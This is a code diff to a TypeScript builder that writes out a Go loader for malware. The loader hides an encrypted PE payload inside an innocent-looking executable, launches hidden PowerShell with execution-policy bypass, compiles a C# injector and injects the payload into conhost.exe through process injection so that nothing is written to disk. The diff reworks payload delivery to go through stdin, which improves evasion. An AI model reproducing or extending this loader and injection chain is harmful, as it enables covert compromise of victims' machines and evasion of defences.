@@ -11,15 +11,14 @@
  * Execution chain on victim:
  *   1. User runs the .exe (looks like any normal executable)
  *   2. Go loader reads embedded encrypted payload from itself
- *   3. Sets env vars with base64-encoded payload + C# injector source
- *   4. Launches PowerShell hidden (no window, CREATE_NO_WINDOW flag)
- *   5. PS decrypts XOR+gzip payload from env var in memory
- *   6. C# P/Invoke injector compiled via Add-Type (random class name per build)
- *   7. conhost.exe started hidden (LOTL — Console Window Host, always present)
- *   8. PE manually mapped into conhost via VirtualAllocEx + WriteProcessMemory
- *   9. Relocations + imports resolved remotely
- *  10. CreateRemoteThread at PE entry point
- *  11. Go loader exits, agent runs inside conhost.exe — no files on disk
+ *   3. Base64-encodes payload, pipes full PS script via stdin to hidden PowerShell
+ *   4. PS decrypts XOR+gzip payload from piped base64 in memory
+ *   5. C# P/Invoke injector compiled via Add-Type (random class name per build)
+ *   6. conhost.exe started hidden (LOTL — Console Window Host, always present)
+ *   7. PE manually mapped into conhost via VirtualAllocEx + WriteProcessMemory
+ *   8. Relocations + imports resolved remotely
+ *   9. CreateRemoteThread at PE entry point
+ *  10. Go loader exits, agent runs inside conhost.exe — no files on disk
  */
 
 import fs from "fs";
@@ -34,13 +33,18 @@ import {
 } from "./pe-injector";
 
 /**
- * Build the Go loader source code that embeds the encrypted PE,
- * sets up env vars, and launches PS hidden for injection.
+ * Build the Go loader source code that embeds the encrypted PE and pipes
+ * the full PS injection script to PowerShell via stdin (no env var size limits).
+ *
+ * The C# source (base64, ~7KB) is safe as a Go string constant.
+ * The injection chain (~700 bytes) is safe as a Go string constant.
+ * The payload (potentially MB+) is base64-encoded at runtime from the
+ * embedded bytes and written to stdin — never touches an env var.
  */
-function buildGoSource(csB64: string, psEnc: string): string {
-  // Use backtick raw strings for the constants to avoid escaping issues
-  // Go raw strings can't contain backticks, so use double-quoted strings
-  // with proper escaping for the base64 content (which is safe — only [A-Za-z0-9+/=])
+function buildGoSource(csB64: string, psChain: string): string {
+  // Escape backslashes and double quotes in the PS chain for Go string literal
+  const chainEscaped = psChain.replace(/\\/g, "\\\\").replace(/"/g, '\\"');
+
   return `package main
 
 import (
@@ -56,20 +60,35 @@ var ep []byte
 
 const csB64 = "${csB64}"
 
-const psEnc = "${psEnc}"
+const psChain = "${chainEscaped}"
 
 func main() {
-	os.Setenv("_EXE_D", base64.StdEncoding.EncodeToString(ep))
-	os.Setenv("_EXE_CS", csB64)
 	cmd := exec.Command(
 		os.Getenv("SYSTEMROOT")+"\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
-		"-nop", "-w", "h", "-ep", "b", "-enc", psEnc,
+		"-nop", "-w", "h", "-ep", "b", "-",
 	)
 	cmd.SysProcAttr = &syscall.SysProcAttr{
 		HideWindow:    true,
 		CreationFlags: 0x08000000,
 	}
-	cmd.Start()
+	stdin, err := cmd.StdinPipe()
+	if err != nil {
+		return
+	}
+	if err := cmd.Start(); err != nil {
+		return
+	}
+	// Pipe PS script to stdin in parts — payload via base64 at runtime (no env var limit)
+	b64 := base64.StdEncoding.EncodeToString(ep)
+	stdin.Write([]byte("$d=[Convert]::FromBase64String('"))
+	stdin.Write([]byte(b64))
+	stdin.Write([]byte("');"))
+	stdin.Write([]byte("$cs=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('"))
+	stdin.Write([]byte(csB64))
+	stdin.Write([]byte("'));"))
+	stdin.Write([]byte(psChain))
+	stdin.Close()
+	cmd.Wait()
 }
 `;
 }
@@ -102,18 +121,11 @@ export async function wrapPeAsLoaderExe(
     const csharpCode = buildCSharpInjector(className);
     const csB64 = Buffer.from(csharpCode, "utf-8").toString("base64");
 
-    // 3. Build PowerShell injection chain
-    //    PS reads payload + C# from env vars set by Go loader
-    const psLines = [
-      `$d=[Convert]::FromBase64String($env:_EXE_D)`,
-      `$cs=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($env:_EXE_CS))`,
-    ];
+    // 3. Build PowerShell injection chain (just the decrypt+inject part)
     const chain = buildPsInjectionChain("$d", "$cs", className, "conhost.exe");
-    const psScript = psLines.join(";") + ";" + chain;
-    const psEnc = Buffer.from(psScript, "utf16le").toString("base64");
 
-    // 4. Generate Go source
-    const goSource = buildGoSource(csB64, psEnc);
+    // 4. Generate Go source — pipes payload+C#+chain to PS stdin
+    const goSource = buildGoSource(csB64, chain);
     fs.writeFileSync(path.join(tmpDir, "main.go"), goSource);
     fs.writeFileSync(path.join(tmpDir, "go.mod"), "module loader\n\ngo 1.21\n");
 
